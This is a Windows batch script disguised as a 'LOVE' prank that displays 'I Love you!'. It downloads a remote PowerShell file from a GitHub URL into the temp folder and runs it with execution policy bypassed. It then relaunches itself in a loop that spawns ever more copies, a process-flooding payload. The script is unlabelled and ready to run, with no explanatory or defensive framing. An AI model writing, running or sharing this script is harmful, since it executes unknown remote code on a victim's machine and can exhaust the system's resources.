@echo off
set path="%~f0"
if "%1"=="love" (goto MainForm)
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -c "" 
del "%temp%\noclose.ps1"
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c Invoke-WebRequest -Uri "https://raw.githubusercontent.com/bfffggh/code/main/hi.ps1" -OutFile "%temp%\noclose.ps1"
:1
C:\Windows\System32\timeout.exe /t 15 >NUL
start C:\Windows\System32\CMD.EXE /c "%path%" love
exit
:MainForm
title LOVE
C:\Windows\System32\WindowsPowerShell\v1.0\PowerShell.exe -ExecutionPolicy Bypass -File "%temp%\noclose.ps1"
color 0a
cls
echo I Love you!
echo Press any key to exit.
pause >NUL
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -c ""
timeout /t 2 >NUL
for /l %%A in (1, 1, 2) do (
start C:\Windows\System32\CMD.EXE /c "%path%" love
)
exit

